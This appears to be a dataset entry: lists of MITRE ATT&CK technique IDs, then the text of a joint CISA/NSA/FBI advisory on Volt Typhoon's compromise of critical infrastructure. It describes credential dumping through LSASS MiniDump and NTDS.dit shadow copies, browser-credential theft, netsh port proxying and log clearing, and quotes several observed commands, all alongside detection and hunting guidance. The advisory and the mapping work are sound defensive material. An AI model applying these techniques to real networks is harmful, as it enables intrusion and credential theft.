","['T1083', 'T1597', 'T1550', 'T1087', 'T1610', 'T1098', 'T1528', 'T1190', 'T1078', 'T1498', 'T1548', 'T1613', 'T1531', 'T1587', 'T1069', 'T1213', 'T1557']","{'T1597.002', 'T1098.001', 'T1553.006', 'T1518.001', 'T1078.002', 'T1018', 'T1119', 'T1136.001', 'T1087.001', 'T1111', 'T1595.002', 'T1654', 'T1555.005', 'T1562.006', 'T1484.001', 'T1556.009', 'T1590', 'T1531', 'T1590.005', 'T1098.003', 'T1157', 'T1484', 'T1087.002', 'T1562.002', 'T1110.004', 'T1552.001', 'T1070.004', 'T1133', 'T1078.004', 'T1062', 'T1021.002', 'T1083', 'T1548.005', 'T1590.001', 'T1078.001', 'T1556.006', 'T1530', 'T1012', 'T1078', 'T1542.002', 'T1210', 'T1201', 'T1527', 'T1078.003', 'T1555'}","{'T1098.001', 'T1608.006', 'T1049, T1018', 'T1518.001', 'T1003.003', 'T1588.002', 'T1078.002', 'T1119', 'T1087.001', 'T1111', 'T1595.002', 'T1654', 'T1016', 'T1484.001', 'T1556.009', 'T1556.007', 'T1082', 'T1590', 'T1556.005', 'T1564.006', 'T1068', 'T1531', 'T1590.005', 'T1021.007', 'T1098.003', 'T1562.001', 'T1484', 'T1590.006', 'T1087.002', 'T1098', 'T1562.002', 'T1110.004', 'T1078, T1133', 'T1550.001, T1527', 'T1552.001', 'T1133', 'T1078.004', 'T1070.004', 'T1021.002', 'T1083', 'T1480.001', 'T1548.005', 'T1078.001', 'T1556.006', 'T1012', 'T1530', 'T1586.003', 'T1078', 'T1542.002', 'T1210', 'T1201', 'T1555.006', 'T1562.010', 'T1078.003', 'T1555'}","{'T1070', 'T1589', 'T1078, T1071, T1016, T1482', 'T1078, T1078.004, T1078.003', 'T1018', 'T1595', 'T1087, T1482', 'T1482', 'T1590', 'T1552', 'T1018, T1087', 'T1068', 'T1531', 'T1078, T1071', 'T1082, T1518', 'T1200', 'T1203', 'T1098', 'T1567', 'T1110', 'T1083', 'T1071', 'T1087, T1110, T1562', 'T1600', 'T1656', 'T1556', 'T1583, T1587, T1590', 'T1078, T1021', 'T1078', 'T1078, T1069', 'T1201', 'T1071, T1133', 'T1003'}"
3,https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a,"






Actions to take today to mitigate Volt Typhoon activity:




Apply patches for internet-facing systems. Prioritize patching critical vulnerabilities in appliances known to be frequently exploited by Volt Typhoon.
Implement phishing-resistant MFA.
Ensure logging is turned on for application, access, and security logs and store logs in a central system.
Plan “end of life” for technology beyond manufacturer’s supported lifecycle.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), and Federal Bureau of Investigation (FBI) assess that People’s Republic of China (PRC) state-sponsored cyber actors are seeking to pre-position themselves on IT networks for disruptive or destructive cyberattacks against U.S. critical infrastructure in the event of a major crisis or conflict with the United States.
CISA, NSA, FBI and the following partners are releasing this advisory to warn critical infrastructure organizations about this assessment, which is based on observations from the U.S. authoring agencies’ incident response activities at critical infrastructure organizations compromised by the PRC state-sponsored cyber group known as Volt Typhoon (also known as Vanguard Panda, BRONZE SILHOUETTE, Dev-0391, UNC3236, Voltzite, and Insidious Taurus):

U.S. Department of Energy (DOE)
U.S. Environmental Protection Agency (EPA)
U.S. Transportation Security Administration (TSA)
Australian Signals Directorate’s (ASD’s) Australian Cyber Security Centre (ACSC)
Canadian Centre for Cyber Security (CCCS), a part of the Communications Security Establishment (CSE)
United Kingdom National Cyber Security Centre (NCSC-UK)
New Zealand National Cyber Security Centre (NCSC-NZ)

The U.S. authoring agencies have confirmed that Volt Typhoon has compromised the IT environments of multiple critical infrastructure organizations—primarily in Communications, Energy, Transportation Systems, and Water and Wastewater Systems Sectors—in the continental and non-continental United States and its territories, including Guam. Volt Typhoon’s choice of targets and pattern of behavior is not consistent with traditional cyber espionage or intelligence gathering operations, and the U.S. authoring agencies assess with high confidence that Volt Typhoon actors are pre-positioning themselves on IT networks to enable lateral movement to OT assets to disrupt functions. The U.S. authoring agencies are concerned about the potential for these actors to use their network access for disruptive effects in the event of potential geopolitical tensions and/or military conflicts. CCCS assesses that the direct threat to Canada’s critical infrastructure from PRC state-sponsored actors is likely lower than that to U.S. infrastructure, but should U.S. infrastructure be disrupted, Canada would likely be affected as well, due to cross-border integration. ASD’s ACSC and NCSC-NZ assess Australian and New Zealand critical infrastructure, respectively, could be vulnerable to similar activity from PRC state-sponsored actors.
As the authoring agencies have previously highlighted, the use of living off the land (LOTL) techniques is a hallmark of Volt Typhoon actors’ malicious cyber activity when targeting critical infrastructure. The group also relies on valid accounts and leverage strong operational security, which combined, allows for long-term undiscovered persistence. In fact, the U.S. authoring agencies have recently observed indications of Volt Typhoon actors maintaining access and footholds within some victim IT environments for at least five years. Volt Typhoon actors conduct extensive pre-exploitation reconnaissance to learn about the target organization and its environment; tailor their tactics, techniques, and procedures (TTPs) to the victim’s environment; and dedicate ongoing resources to maintaining persistence and understanding the target environment over time, even after initial compromise.
The authoring agencies urge critical infrastructure organizations to apply the mitigations in this advisory and to hunt for similar malicious activity using the guidance herein provided, along with the recommendations found in joint guide Identifying and Mitigating Living Off the Land Techniques. These mitigations are primarily intended for IT and OT administrators in critical infrastructure organizations. Following the mitigations for prevention of or in response to an incident will help disrupt Volt Typhoon’s accesses and reduce the threat to critical infrastructure entities.
If activity is identified, the authoring agencies strongly recommend that critical infrastructure organizations apply the incident response recommendations in this advisory and report the incident to the relevant agency (see Contact Information section).
For additional information, see joint advisory People’s Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection and U.S. Department of Justice (DOJ) press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure. For more information on PRC state-sponsored malicious cyber activity, see CISA’s China Cyber Threat Overview and Advisories webpage.
Download the PDF version of this report:


AA24-038A PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure
(PDF,       1.56 MB
  )


Read the accompanying Malware Analysis Report: MAR-10448362-1.v1 Volt Typhoon.
For a downloadable copy of indicators of compromise (IOCs), see:


MAR-10448362.c1.v2.CLEAR_stix2.json
(JSON,       51.99 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See Appendix C: MITRE ATT&CK Tactics and Techniques section for tables of the Volt Typhoon cyber threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview of Activity
In May 2023, the authoring agencies—working with industry partners—disclosed information about activity attributed to Volt Typhoon (see joint advisory People’s Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection). Since then, CISA, NSA, and FBI have determined that this activity is part of a broader campaign in which Volt Typhoon actors have successfully infiltrated the networks of critical infrastructure organizations in the continental and non-continental United States and its territories, including Guam.
The U.S. authoring agencies have primarily observed compromises linked to Volt Typhoon in Communications, Energy, Transportation Systems, and Water and Wastewater Systems sector organizations’ IT networks. Some victims are smaller organizations with limited cybersecurity capabilities that provide critical services to larger organizations or key geographic locations.
Volt Typhoon actors tailor their TTPs to the victim environment; however, the U.S. authoring agencies have observed the actors typically following the same pattern of behavior across identified intrusions. Their choice of targets and pattern of behavior is not consistent with traditional cyber espionage or intelligence gathering operations, and the U.S. authoring agencies assess with high confidence that Volt Typhoon actors are pre-positioning themselves on IT networks to enable the disruption of OT functions across multiple critical infrastructure sectors (see Figure 1).

Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the target organization’s network architecture and operational protocols. This reconnaissance includes identifying network topologies, security measures, typical user behaviors, and key network and IT staff. The intelligence gathered by Volt Typhoon actors is likely leveraged to enhance their operational security. For example, in some instances, Volt Typhoon actors may have abstained from using compromised credentials outside of normal working hours to avoid triggering security alerts on abnormal account activities.
Volt Typhoon typically gains initial access to the IT network by exploiting known or zero-day vulnerabilities in public-facing network appliances (e.g., routers, virtual private networks [VPNs], and firewalls) and then connects to the victim’s network via VPN for follow-on activities.
Volt Typhoon aims to obtain administrator credentials within the network, often by exploiting privilege escalation vulnerabilities in the operating system or network services. In some cases, Volt Typhoon has obtained credentials insecurely stored on a public-facing network appliance.
Volt Typhoon uses valid administrator credentials to move laterally to the domain controller (DC) and other devices via remote access services such as Remote Desktop Protocol (RDP).
Volt Typhoon conducts discovery in the victim’s network, leveraging LOTL binaries for stealth. A key tactic includes using PowerShell to perform targeted queries on Windows event logs, focusing on specific users and periods. These queries facilitate the discreet extraction of security event logs into .dat files, allowing Volt Typhoon actors to gather critical information while minimizing detection. This strategy, blending in-depth pre-compromise reconnaissance with meticulous post-exploitation intelligence collection, underscores their sophisticated and strategic approach to cyber operations.
Volt Typhoon achieves full domain compromise by extracting the Active Directory database (NTDS.dit) from the DC. Volt Typhoon frequently employs the Volume Shadow Copy Service (VSS) using command-line utilities such as vssadmin to access NTDS.dit. The NTDS.dit file is a centralized repository that contains critical Active Directory data, including user accounts, passwords (in hashed form), and other sensitive data, which can be leveraged for further exploitation. This method entails the creation of a shadow copy—a point-in-time snapshot—of the volume hosting the NTDS.dit file. By leveraging this snapshot, Volt Typhoon actors effectively bypass the file locking mechanisms inherent in a live Windows environment, which typically prevent direct access to the NTDS.dit file while the domain controller is operational.
Volt Typhoon likely uses offline password cracking techniques to decipher these hashes. This process involves extracting the hashes from the NTDS.dit file and then applying various password cracking methods, such as brute force attacks, dictionary attacks, or more sophisticated techniques like rainbow tables to uncover the plaintext passwords. The successful decryption of these passwords allows Volt Typhoon actors to obtain elevated access and further infiltrate and manipulate the network.
Volt Typhoon uses elevated credentials for strategic network infiltration and additional discovery, often focusing on gaining capabilities to access OT assets. Volt Typhoon actors have been observed testing access to domain-joint OT assets using default OT vendor credentials, and in certain instances, they have possessed the capability to access OT systems whose credentials were compromised via NTDS.dit theft. This access enables potential disruptions, such as manipulating heating, ventilation, and air conditioning (HVAC) systems in server rooms or disrupting critical energy and water controls, leading to significant infrastructure failures (in some cases, Volt Typhoon actors had the capability to access camera surveillance systems at critical infrastructure facilities). In one confirmed compromise, Volt Typhoon actors moved laterally to a control system and were positioned to move to a second control system.


 

Figure 1: Typical Volt Typhoon Activity

After successfully gaining access to legitimate accounts, Volt Typhoon actors exhibit minimal activity within the compromised environment (except discovery as noted above), suggesting their objective is to maintain persistence rather than immediate exploitation. This assessment is supported by observed patterns where Volt Typhoon methodically re-targets the same organizations over extended periods, often spanning several years, to continuously validate and potentially enhance their unauthorized accesses. Evidence of their meticulous approach is seen in instances where they repeatedly exfiltrate domain credentials, ensuring access to current and valid accounts. For example, in one compromise, Volt Typhoon likely extracted NTDS.dit from three domain controllers in a four-year period. In another compromise, Volt Typhoon actors extracted NTDS.dit two times from a victim in a nine-month period.
Industry reporting—identifying that Volt Typhoon actors are silent on the network following credential dumping and perform discovery to learn about the environment, but do not exfiltrate data—is consistent with the U.S. authoring agencies’ observations. This indicates their aim is to achieve and maintain persistence on the network. In one confirmed compromise, an industry partner observed Volt Typhoon actors dumping credentials at regular intervals.
In addition to leveraging stolen account credentials, the actors use LOTL techniques and avoid leaving malware artifacts on systems that would cause alerts. Their strong focus on stealth and operational security allows them to maintain long-term, undiscovered persistence. Further, Volt Typhoon’s operational security is enhanced by targeted log deletion to conceal their actions within the compromised environment.
See the below sections for Volt Typhoon TTPs observed by the U.S. authoring agencies from multiple confirmed Volt Typhoon compromises.
Observed TTPs
Reconnaissance
Volt Typhoon actors conduct extensive pre-compromise reconnaissance [TA0043] to learn about the target organization [T1591], its network [T1590], and its staff [T1589]. This includes web searches [T1593]—including victim-owned sites [T1594]—for victim host [T1592], identity, and network information, especially for information on key network and IT administrators. According to industry reporting, Volt Typhoon actors use FOFA[1], Shodan, and Censys for querying or searching for exposed infrastructure. In some instances, the U.S. authoring agencies have observed Volt Typhoon actors targeting the personal emails of key network and IT staff [T1589.002] post compromise.
Resource Development
Historically, Volt Typhoon actors use multi-hop proxies for command and control (C2) infrastructure [T1090.003]. The proxy is typically composed of virtual private servers (VPSs) [T1583.003] or small office/home office (SOHO) routers. Recently, Volt Typhoon actors used Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support their operations [T1584.005]. (See DOJ press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure for more information).
Initial Access
To obtain initial access [TA0001], Volt Typhoon actors commonly exploit vulnerabilities in networking appliances such as those from Fortinet, Ivanti Connect Secure (formerly Pulse Secure), NETGEAR, Citrix, and Cisco [T1190]. They often use publicly available exploit code for known vulnerabilities [T1588.005] but are also adept at discovering and exploiting zero-day vulnerabilities [T1587.004].

In one confirmed compromise, Volt Typhoon actors likely obtained initial access by exploiting CVE-2022-42475 in a network perimeter FortiGate 300D firewall that was not patched. There is evidence of a buffer overflow attack identified within the Secure Sockets Layer (SSL)-VPN crash logs.

Once initial access is achieved, Volt Typhoon actors typically shift to establishing persistent access [TA0003]. They often use VPN sessions to securely connect to victim environments [T1133], enabling discreet follow-on intrusion activities. This tactic not only provides a stable foothold in the network but also allows them to blend in with regular traffic, significantly reducing their chances of detection.
Execution
Volt Typhoon actors rarely use malware for post-compromise execution. Instead, once Volt Typhoon actors gain access to target environments, they use hands-on-keyboard activity via the command-line [T1059] and other native tools and processes on systems [T1218] (often referred to as “LOLBins”), known as LOTL, to maintain and expand access to the victim networks. According to industry reporting, some “commands appear to be exploratory or experimental, as the operators [i.e., malicious actors] adjust and repeat them multiple times.”[2]
For more details on LOTL activity, see the Credential Access and Discovery sections and Appendix A: Volt Typhoon LOTL Activity.
Similar to LOTL, Volt Typhoon actors also use legitimate but outdated versions of network admin tools. For example, in one confirmed compromise, actors downloaded [T1105] an outdated version of comsvcs.dll on the DC in a non-standard folder. comsvcs.dll is a legitimate Microsoft Dynamic Link Library (DLL) file normally found in the System32 folder. The actors used this DLL with MiniDump and the process ID of the Local Security Authority Subsystem Service (LSASS) to dump the LSASS process memory [T1003.001] and obtain credentials (LSASS process memory space contains hashes for the current user’s operating system (OS) credentials).
The actors also use legitimate non-native network admin and forensic tools. For example, Volt Typhoon actors have been observed using Magnet RAM Capture (MRC) version 1.20 on domain controllers. MRC is a free imaging tool that captures the physical memory of a computer, and Volt Typhoon actors likely used it to analyze in-memory data for sensitive information (such as credentials) and in-transit data not typically accessible on disk. Volt Typhoon actors have also been observed implanting Fast Reverse Proxy (FRP) for command and control.[3] (See the Command and Control section).
Persistence
Volt Typhoon primarily relies on valid credentials for persistence [T1078].
Defense Evasion
Volt Typhoon has strong operational security. Their actors primarily use LOTL for defense evasion [TA0005], which allows them to camouflage their malicious activity with typical system and network behavior, potentially circumventing simplistic endpoint security capabilities. For more information, see joint guide Identifying and Mitigating Living off the Land Techniques.
Volt Typhoon actors also obfuscate their malware. In one confirmed compromise, Volt Typhoon obfuscated FRP client files (BrightmetricAgent.exe and SMSvcService.exe) and the command-line port scanning utility ScanLine by packing the files with Ultimate Packer for Executables (UPX) [T1027.002]. FRP client applications support encryption, compression, and easy token authentication and work across multiple protocols—including transmission control protocol (TCP), user datagram protocol (UDP), hypertext transfer protocol (HTTP), and hypertext transfer protocol secure (HTTPS). The FRP client applications use the Kuai connection protocol (KCP) for error-checked and anonymous data stream delivery over UDP, with packet-level encryption support. See Appendix C and CISA Malware Analysis Report (MAR)-10448362-1.v1 for more information.
In addition to LOTL and obfuscation techniques, Volt Typhoon actors have been observed selectively clearing Windows Event Logs [T1070.001], system logs, and other technical artifacts to remove evidence [T1070.009] of their intrusion activity and masquerading file names [T1036.005].
Credential Access
Volt Typhoon actors first obtain credentials from public-facing appliances after gaining initial access by exploiting privilege escalation vulnerabilities [T1068] in the operating system or network services. In some cases, they have obtained credentials insecurely stored on the appliance [T1552]. In one instance, where Volt Typhoon likely exploited CVE-2022-42475 in an unpatched Fortinet device, Volt Typhoon actors compromised a domain admin account stored inappropriately on the device.
Volt Typhoon also consistently obtains valid credentials by extracting the Active Directory database file (NTDS.dit)—in some cases multiple times from the same victim over long periods [T1003.003]. NTDS.dit contains usernames, hashed passwords, and group memberships for all domain accounts, essentially allowing for full domain compromise if the hashes can be cracked offline.
To obtain NTDS.dit, the U.S. authoring agencies have observed Volt Typhoon:

Move laterally [TA0008] to the domain controller via an interactive RDP session using a compromised account with domain administrator privileges [T1021.001];
Execute the Windows-native vssadmin [T1006] command to create a volume shadow copy;
Use Windows Management Instrumentation Console (WMIC) commands [T1047] to execute ntdsutil (a LOTL utility) to copy NTDS.dit and SYSTEM registry hive from the volume shadow copy; and
Exfiltrate [TA0010] NTDS.dit and SYSTEM registry hive to crack passwords offline) [T1110.002]. (For more details, including specific commands used, see Appendix A: Volt Typhoon LOTL Activity.)Note: A volume shadow copy contains a copy of all the files and folders that exist on the specified volume. Each volume shadow copy created on a DC includes its NTDS.dit and the SYSTEM registry hive, which provides keys to decrypt the NTDS.dit file.

Volt Typhoon actors have also been observed interacting with a PuTTY application by enumerating existing stored sessions [T1012]. Given this interaction and the exposure of cleartext-stored proxy passwords used in remote administration, Volt Typhoon actors potentially had access to PuTTY profiles that allow access to critical systems (see the Lateral Movement section).
According to industry reporting, Volt Typhoon actors attempted to dump credentials through LSASS (see Appendix B for commands used).[2]
The U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest credentials, and industry partners have observed Volt Typhoon leveraging Impacket.[2]

Mimikatz is a credential dumping tool and Volt Typhoon actors use it to obtain credentials. In one confirmed compromise, the Volt Typhoon used RDP to connect to a server and run Mimikatz after leveraging a compromised administrator account to deploy it.
Impacket is an open source Python toolkit for programmatically constructing and manipulating network protocols. It contains tools for Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks—as well as remote service execution.

Discovery
Volt Typhoon actors have been observed using commercial tools, LOTL utilities, and appliances already present on the system for system information [T1082], network service [T1046], group [T1069] and user [T1033] discovery.
Volt Typhoon uses at least the following LOTL tools and commands for system information, network service, group, and user discovery techniques:





cmd
certutil
dnscmd
ldifde
makecab
net user/group/use
netsh




nltest
netstat
ntdsutil
ping
PowerShell
quser
reg query/reg save




systeminfo
tasklist
wevtutil
whoami
wmic
xcopy





Some observed specific examples of discovery include:

Capturing successful logon events [T1654].

Specifically, in one incident, analysis of the PowerShell console history of a domain controller indicated that security event logs were directed to a file named user.dat, as evidenced by the executed command Get-EventLog security -instanceid 4624 -after [year-month-date] | fl * | Out-File 'C:\users\public\documents\user.dat'. This indicates the group's specific interest in capturing successful logon events (event ID 4624) to analyze user authentication patterns within the network. Additionally, file system analysis, specifically of the Master File Table (MFT), uncovered evidence of a separate file, systeminfo.dat, which was created in C:\Users\Public\Documents but subsequently deleted [T1070.004]. The presence of these activities suggests a methodical approach by Volt Typhoon actors in collecting and then possibly removing traces of sensitive log information from the compromised system.


Executing tasklist /v to gather a detailed process listing [T1057], followed by executing taskkill /f /im rdpservice.exe (the function of this executable is not known).
Executing net user and quser for user account information [T1087.001].
Creating and accessing a file named rult3uil.log on a domain controller in C:\Windows\System32\. The rult3uil.log file contained user activities on a compromised system, showcasing a combination of window title information [T1010] and focus shifts, keypresses, and command executions across Google Chrome and Windows PowerShell, with corresponding timestamps.
Employing ping with various IP addresses to check network connectivity [T1016.001] and net start to list running services [T1007].

See Appendix A for additional LOTL examples.
In one confirmed compromise, Volt Typhoon actors attempted to use Advanced IP Scanner, which was on the network for admin use, to scan the network.
Volt Typhoon actors have been observed strategically targeting network administrator web browser data—focusing on both browsing history and stored credentials [T1555.003]—to facilitate targeting of personal email addresses (see the Reconnaissance section) for further discovery and possible network modifications that may impact the threat actor’s persistence within victim networks.
In one confirmed compromise:

Volt Typhoon actors obtained the history file from the User Data directory of a network administrator user’s Chrome browser. To obtain the history file, Volt Typhoon actors first executed an RDP session to the user’s workstation where they initially attempted, and failed, to obtain the C$ File Name: users\{redacted}\appdata\local\Google\Chrome\UserData\default\History file, as evidenced by the accompanying 1016 (reopen failed) SMB error listed in the application event log. The threat actors then disconnected the RDP session to the workstation and accessed the file C:\Users\{redacted}\Downloads\History.zip. This file presumably contained data from the User Data directory of the user’s Chrome browser, which the actors likely saved in the Downloads directory for exfiltration [T1074]. Shortly after accessing the history.zip file, the actors terminated RDP sessions.
About four months later, Volt Typhoon actors accessed the same user’s Chrome data C$ File Name: Users\{redacted}\AppData\Local\Google\Chrome\User Data\Local State and $ File Name: Users\{redacted}\AppData\Local\Google\Chrome\User Data\Default\Login Data via SMB. The Local State file contains the Advanced Encryption Standard (AES) encryption key [T1552.004] used to encrypt the passwords stored in the Chrome browser, which would enable the actors to obtain plaintext passwords stored in the Login Data file in the Chrome browser.

In another confirmed compromise, Volt Typhoon actors accessed directories containing Chrome and Edge user data on multiple systems. Directory interaction was observed over the network to paths such as C:\Users\{redacted}\AppData\Local\Google\Chrome\User Data\ and C:\Users\{redacted}\AppData\Local\Microsoft\Edge\User Data\. They also enumerated several directories, including directories containing vulnerability testing and cyber related content and facilities data, such as construction drawings [T1083].
Lateral Movement
For lateral movement, Volt Typhoon actors have been observed predominantly employing RDP with compromised valid administrator credentials. Note: With a full on-premises Microsoft Active Directory identity compromise (see the Credential Access section), the group may be capable of using other methods such as Pass the Hash or Pass the Ticket for lateral movement [T1550].
In one confirmed compromise of a Water and Wastewater Systems Sector entity, after obtaining initial access, Volt Typhoon actors connected to the network via a VPN with administrator credentials they obtained and opened an RDP session with the same credentials to move laterally. Over a nine-month period, they moved laterally to a file server, a domain controller, an Oracle Management Server (OMS), and a VMware vCenter server. The actors obtained domain credentials from the domain controller and performed discovery, collection, and exfiltration on the file server (see the Discovery and Collection and Exfiltration sections).
Volt Typhoon’s movement to the vCenter server was likely strategic for pre-positioning to OT assets. The vCenter server was adjacent to OT assets, and Volt Typhoon actors were observed interacting with the PuTTY application on the server by enumerating existing stored sessions. With this information, Volt Typhoon potentially had access to a range of critical PuTTY profiles, including those for water treatment plants, water wells, an electrical substation, OT systems, and network security devices. This would enable them to access these critical systems [T1563]. See Figure 2.

 

Figure 2: Volt Typhoon Lateral Movement Path File Server, DC, and OT-Adjacent Assets

Additionally, Volt Typhoon actors have been observed using PSExec to execute remote processes, including the automated acceptance of the end-user license agreement (EULA) through an administrative account, signified by the accepteula command flag.
Volt Typhoon actors may have attempted to move laterally to a cloud environment in one victim’s network but direct attribution to the Volt Typhoon group was inconclusive. During the period of the their known network presence, there were anomalous login attempts to an Azure tenant [T1021.007] potentially using credentials [T1078.004] previously compromised from theft of NTDS.dit. These attempts, coupled with misconfigured virtual machines with open RDP ports, suggested a potential for cloud-based lateral movement. However, subsequent investigations, including password changes and multifactor authentication (MFA) implementations, revealed authentication failures from non-associated IP addresses, with no definitive link to Volt Typhoon.
Collection and Exfiltration
The U.S. authoring agencies assess Volt Typhoon primarily collects information that would facilitate follow-on actions with physical impacts. For example, in one confirmed compromise, they collected [TA0009] sensitive information obtained from a file server in multiple zipped files [T1560] and likely exfiltrated [TA0010] the files via Server Message Block (SMB) [T1048] (see Figure 3). Collected information included diagrams and documentation related to OT equipment, including supervisory control and data acquisition (SCADA) systems, relays, and switchgear. This data is crucial for understanding and potentially impacting critical infrastructure systems, indicating a focus on gathering intelligence that could be leveraged in actions targeting physical assets and systems.

 

Figure 3: Volt Typhoon Attack Path for Exfiltration of Data from File Server

In another compromise, Volt Typhoon actors leveraged WMIC to create and use temporary directories (C:\Users\Public\pro, C:\Windows\Temp\tmp, C:\Windows\Temp\tmp\Active Directory and C:\Windows\Temp\tmp\registry) to stage the extracted ntds.dit and SYSTEM registry hives from ntdsutil execution volume shadow copies (see the Credential Access section) obtained from two DCs. They then compressed and archived the extracted ntds.dit and accompanying registry files by executing ronf.exe, which was likely a renamed version of the archive utility rar.exe) [T1560.001].
Command and Control
Volt Typhoon actors have been observed leveraging compromised SOHO routers and virtual private servers (VPS) to proxy C2 traffic. For more information, see DOJ press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure).
They have also been observed setting up FRP clients [T1090] on a victim’s corporate infrastructure to establish covert communications channels [T1573] for command and control. In one instance, Volt Typhoon actors implanted the FRP client with filename SMSvcService.exe on a Shortel Enterprise Contact Center (ECC) server and a second FRP client with filename Brightmetricagent.exe on another server. These clients, when executed via PowerShell [T1059.001], open reverse proxies between the compromised system and Volt Typhoon C2 servers. Brightmetricagent.exe has additional capabilities. The FRP client can locate servers behind a network firewall or obscured through Network Address Translation (NAT) [T1016]. It also contains multiplexer libraries that can bi-directionally stream data over NAT networks and contains a command-line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh) [T1059.004]. See Appendix C and MAR-10448362-1.v1 for more information.
In the same compromise, Volt Typhoon actors exploited a Paessler Router Traffic Grapher (PRTG) server as an intermediary for their FRP operations. To facilitate this, they used the netsh command, a legitimate Windows command, to create a PortProxy registry modification [T1112] on the PRTG server [T1090.001]. This key alteration redirected specific port traffic to Volt Typhoon’s proxy infrastructure, effectively converting the PRTG’s server into a proxy for their C2 traffic [T1584.004] (see Appendix B for details).
DETECTION/HUNT RECOMMENDATIONS
Apply Living off the Land Detection Best Practices
Apply the prioritized detection and hardening best practice recommendations provided in joint guide Identifying and Mitigating Living off the Land Techniques. Many organizations lack security and network management best practices (such as established baselines) that support detection of malicious LOTL activity—this makes it difficult for network defenders to discern legitimate behavior from malicious behavior and conduct behavior analytics, anomaly detection, and proactive hunting. Conventional IOCs associated with the malicious activity are generally lacking, complicating network defenders’ efforts to identify, track, and categorize this sort of malicious behavior. This advisory provides guidance for a multifaceted cybersecurity strategy that enables behavior analytics, anomaly detection, and proactive hunting, which are part of a comprehensive approach to mitigating cyber threats that employ LOTL techniques.
Review Application, Security, and System Event Logs
Routinely review application, security, and system event logs, focusing on Windows Extensible Storage Engine Technology (ESENT) Application Logs. Due to Volt Typhoon’s ability for long-term undetected persistence, network defenders should assume significant dwell time and review specific application event log IDs, which remain on endpoints for longer periods compared to security event logs and other ephemeral artifacts. Focus on Windows ESENT logs because certain ESENT Application Log event IDs (216, 325, 326, and 327) may indicate actors copying NTDS.dit.
See Table 1 for examples of ESENT and other key log indicators that should be investigated. Please note that incidents may not always have exact matches listed in the Event Detail column due to variations in event logging and TTPs.

Table 1: Key Log Indicators for Detecting Volt Typhoon Activity


Event ID (Log)
Event Detail
Description




216 (Windows ESENT Application Log)
A database location change was detected from 'C:\Windows\NTDS\ntds.dit' to '\\?\GLOBALROOT\Device\{redacted}VolumeShadowCopy1\Windows\NTDS\ntds.dit'
A change in the NTDS.dit database location is detected. This could suggest an initial step in NTDS credential dumping where the database is being prepared for extraction.


325 (Windows ESENT Application Log)
The database engine created a new database (2, C:\Windows\Temp\tmp\Active Directory\ntds.dit).
Indicates creation of a new NTDS.dit file in a non-standard directory. Often a sign of data staging for exfiltration. Monitor for unusual database operations in temp directories.


637 (Windows ESENT Application Log)
C:\Windows\Temp\tmp\Active Directory\ntds.jfm-++- (0) New flush map file “C:\Windows\Temp\tmp\Active Directory\ntds.jfm” will be created to enable persisted lost flush detection.
A new flush map file is being created for NTDS.dit. This may suggest ongoing operations related to NTDS credential dumping, potentially capturing uncommitted changes to the NTDS.dit file.


326 (Windows ESENT Application Log)

NTDS-++-12460,D,100-++--++-1-++-
C:\$SNAP_{redacted}_VOLUMEC$\Windows\NTDS\ntds.dit-++-0-++- [1] The database engine attached a database. Began mounting of C:\Windows\NTDS\ntds.dit file created from volume shadow copy process

Represents the mounting of an NTDS.dit file from a volume shadow copy. This is a critical step in NTDS credential dumping, indicating active manipulation of a domain controller’s data.


327 (Windows ESENT Application Log)
C:\Windows\Temp\tmp\Active Directory\ntds.dit-++-1-++- [1] The database engine detached a database (2, C:\Windows\Temp\tmp\Active Directory\ntds.dit). Completion of mounting of ntds.dit file to C:\Windows\Temp\tmp\Active Director
The detachment of a database, particularly in a temp directory, could indicate the completion of a credential dumping process, potentially as part of exfiltration preparations.


21 (Windows Terminal Services Local Session Manager Operational Log)
Remote Desktop Services: Session logon succeeded: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted}
Successful authentication to a Remote Desktop Services session.


22 (Windows Terminal Services Local Session Manager Operational Log)
Remote Desktop Services: Shell start notification received: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted}
Successful start of a new Remote Desktop session. This may imply lateral movement or unauthorized remote access, especially if the user or session is unexpected.


23 (Windows Terminal Services Local Session Manager Operational Log)
Remote Desktop Services: Session logoff succeeded: User: {redacted}\{redacted} Session ID: {redacted}
Successful logoff of Remote Desktop session.


24 (Windows Terminal Services Local Session Manager Operational Log)
Remote Desktop Services: Session has been disconnected: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted}
Remote Desktop session disconnected by user or due to network connectivity issues.


25 (Windows  Terminal Services Local Session Manager Operational Log)
Remote Desktop Services: Session reconnection succeeded: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted}
Successful reconnection to a Remote Desktop Services session. This may imply lateral movement or unauthorized remote access, especially if the user or session is unexpected.


1017 (Windows System Log)

Handle scavenged.
Share Name: C$
File Name:
users\{redacted}\downloads\History.zip Durable: 1 Resilient or Persistent: 0 Guidance: The server closed a handle that was previously reserved for a client after 60 seconds.

Indicates the server closed a handle for a client. While common in network operations, unusual patterns or locations (like History.zip in a user’s downloads) may suggest data collection from a local system.


1102 (Windows Security Log)
All
All Event ID 1102 entries should be investigated as logs are generally not cleared and this is a known Volt Typhoon tactic to cover their tracks.



Monitor and Review OT System Logs

Review access logs for communication paths between IT and OT networks, looking for anomalous accesses or protocols.
Measure the baseline of normal operations and network traffic for the industrial control system (ICS) and assess traffic anomalies for malicious activity.
